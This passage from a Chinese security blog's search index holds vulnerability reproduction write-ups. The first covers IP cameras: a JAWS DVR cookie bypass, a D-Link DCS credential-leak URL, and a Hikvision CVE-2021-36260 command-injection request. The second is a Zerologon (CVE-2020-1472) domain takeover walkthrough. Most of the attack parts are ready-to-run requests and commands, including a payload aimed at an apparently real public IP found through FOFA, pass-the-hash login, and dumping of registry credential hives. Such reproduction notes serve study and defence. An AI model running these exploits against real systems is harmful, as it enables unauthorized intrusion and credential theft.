alt="image-20200220160326388"></p><p><strong>漏洞描述</strong>：上面这段代码比较短我还是很容易看懂的，判断cookie里面dvr_usr和dvr_pwd不为空就可以进入控制面板了，而且对内容无要求。</p><p><strong>修复建议</strong>：</p><p><strong>漏洞复现</strong>：</p><p>2020年2月20日。fofa搜app=”JAWS/1.0”，随便找的一个就成功了，感觉也挺容易的。</p><p>添加两条cookie，dvr_usr和dvr_pwd，值随意，添加后访问view2.html。</p><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220161019296.png" alt="image-20200220161019296"></p><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220161721889.png" alt="image-20200220161721889"></p><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220162108549.png" alt="image-20200220162108549"></p><h5 id="2-3-D-Link-DCS系列监控-账号密码信息泄露漏洞-CVE-2020-25078"><a href="#2-3-D-Link-DCS系列监控-账号密码信息泄露漏洞-CVE-2020-25078" class="headerlink" title="2.3 D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078"></a>2.3 D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOFA： app&#x3D;”D_Link-DCS-2530L”</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DCS-2530L</span><br><span class="line">DCS-2670L</span><br><span class="line">DCS-4603</span><br><span class="line">DCS-4622</span><br><span class="line">等多个DCS系列系统</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;config&#x2F;getuser?index&#x3D;0#访问漏洞位置获取账密后再访问首页登录</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210426597.png" alt="image-20210401210426597"></p><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210448193.png" alt="image-20210401210448193"></p><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210543504.png" alt="image-20210401210543504"></p><h5 id="2-4-海康威视远程代码执行-CVE-2021-36260"><a href="#2-4-海康威视远程代码执行-CVE-2021-36260" class="headerlink" title="2.4 海康威视远程代码执行 CVE-2021-36260"></a>2.4 海康威视远程代码执行 CVE-2021-36260</h5><p>把ls命令写到x文件中，成功了状态码是500，fofa试了很多，1/25吧，不成功是401未认证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;SDK&#x2F;webLanguage HTTP&#x2F;1.1</span><br><span class="line">Host: 14.182.242.250</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Referer: http:&#x2F;&#x2F;14.182.242.250&#x2F;doc&#x2F;page&#x2F;login.asp?_1642579888212</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 78</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;language&gt;$(ls -l &gt; webLib&#x2F;x)&lt;&#x2F;language&gt;</span><br></pre></td></tr></table></figure><p>访问命令执行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;x HTTP&#x2F;1.1</span><br><span class="line">Host: 14.182.242.250</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Referer: http:&#x2F;&#x2F;14.182.242.250&#x2F;doc&#x2F;page&#x2F;login.asp?_1642579888212</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 78</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20220119161645838.png" alt="image-20220119161645838"></p><p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20220119161708977.png" alt="image-20220119161708977"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 摄像头 </tag>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2020-1472域内提权漏洞</title>
      <link href="2021/03/29/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/03/29/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CVE-2020-1472是微软八月修复的一个严重的权限提升漏洞(并于昨天2020年9月15日secura发布了相关的漏洞细节，随后相关exp被构造发布)，通过Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接安全通道时，存在特权提升的利用点，该漏洞的CVSS分高达10分，攻击者只需要在内网中有一个立足点，就可以远程获取域控的管理员权限。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure><h1 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.通过漏洞脚本置空域控保存在AD中的密码</span><br><span class="line">2.通过secretsdump.py获取域控上的用户hash</span><br><span class="line">3.通过该hash使用wmiexec.py登录域控获取一个shell</span><br><span class="line">4.通过shell获取本地保存的原hash key</span><br><span class="line">5.通过获取的hash key恢复置空的域控密码</span><br></pre></td></tr></table></figure><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p> 利用脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dirkjanm&#x2F;CVE-2020-1472#域控保存在AD的密码置空，对域控有影响，要及时恢复</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;risksense&#x2F;zerologon#恢复脚本</span><br></pre></td></tr></table></figure><p>除了上述脚本之外，还要用到python3下impacket模块中的secretsdump.py和wmiexec.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py#置空域控hash后，获取其他用户hash</span><br><span class="line">wmiexec.py#用获得的用户hash登录上去，获得一个shell</span><br></pre></td></tr></table></figure><p>这里对版本有要求，python3.7以上，impacket版本v0.9.22.dev1以上</p><p>我实验的时候用的kali做攻击机，impacket模块中两个脚本的路径是<kbd>/usr/share/doc/python3-impacket/examples</kbd>，要查看版本随便运行一个文件就可以看到</p><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127111729607.png" alt="image-20210127111729607"></p><p>新版impacket包下载地址<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>下载后进入目录运行<kbd>sudo pip3 install .</kbd>即可安装新版impacket模块。如果没有pip3，按照以下方法安装pip3。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py</span><br><span class="line">python3 get-pip.py</span><br><span class="line">pip3 -V </span><br></pre></td></tr></table></figure><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127112246983.png" alt="image-20210127112246983"></p><p>都准备就绪后就可以开始实验了，环境如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机kali192.168.154.128</span><br><span class="line">边界机win7192.168.154.130192.168.52.143</span><br><span class="line">域控server08192.168.52.138</span><br></pre></td></tr></table></figure><p>kali作为cs服务端，获取边界机的会话后设置代理24446端口</p><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113026628.png" alt="image-20210127113026628"></p><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113108084.png" alt="image-20210127113108084"></p><p>配置代理后，kali就可以访问域控了。OWA是域控主机名，可通过cs端口扫描到。也可在system权限下通过命令查找域控信息。</p><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113652512.png" alt="image-20210127113652512"></p><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114005936.png" alt="image-20210127114005936"></p><p>这里先用cve-2020-1472-exploit.py置空域控保存在AD中的密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 cve-2020-1472-exploit.py OWA 192.168.52.138</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114042552.png" alt="image-20210127114042552"></p><p>查看域内用户hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py god.org&#x2F;OWA\$@192.168.52.138 -just-dc -no-pass</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114555661.png" alt="image-20210127114555661"></p><p>通过wmiexec获取到Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py god.org&#x2F;administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:3f589ddca9ecc4534635e8d432b5c541</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114814615.png" alt="image-20210127114814615"></p><p>接下来就是恢复hash了，命令如下</p><p>先备份注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115248808.png" alt="image-20210127115248808"></p><p>退出后可以看到多出三个文件</p><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115405538.png" alt="image-20210127115405538"></p><p>使用secretsdump解析保存在本地的nt hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115532747.png" alt="image-20210127115532747"></p><p>恢复原hash，这一步比较久</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 reinstall_original_pw.py OWA 192.168.52.138 8e3ee83b233ce68699a27b6aa9c196dd</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120102589.png" alt="image-20210127120102589"></p><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120119842.png" alt="image-20210127120119842"></p><p>此时想再查看域内用户hash就会失败了</p><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120322059.png" alt="image-20210127120322059"></p><p>但是因为之前拿到了administrator的hash，可以再用wmiexec获得shell。</p><p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120520658.png" alt="image-20210127120520658"></p><p>回顾一个整个过程，利用1472漏洞把域控保存在AD中的密码置空，置空后用secretsdump.py的-no-pass获取域控administrator的hash，再用wmiexec.py和admin的hash登录到域控获得一个shell，通过shell获取本地保存的原hash key，最后通过获取的hash key恢复置空的域控密码，过程中得到的admin的hash仍然可以用于登录域控。</p><p>争议：恢复原密码所用到的hash，看文章也有说是$MACHINE.ACC:plain_password_hex中的值</p><p>参考：</p><p><a href="https://www.cnblogs.com/goabout2/p/13676527.html">https://www.cnblogs.com/goabout2/p/13676527.html</a></p><p><a href="https://www.cnblogs.com/sup3rman/p/13680262.html">https://www.cnblogs.com/sup3rman/p/13680262.html</a></p><p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html">https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve-2020-1472 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
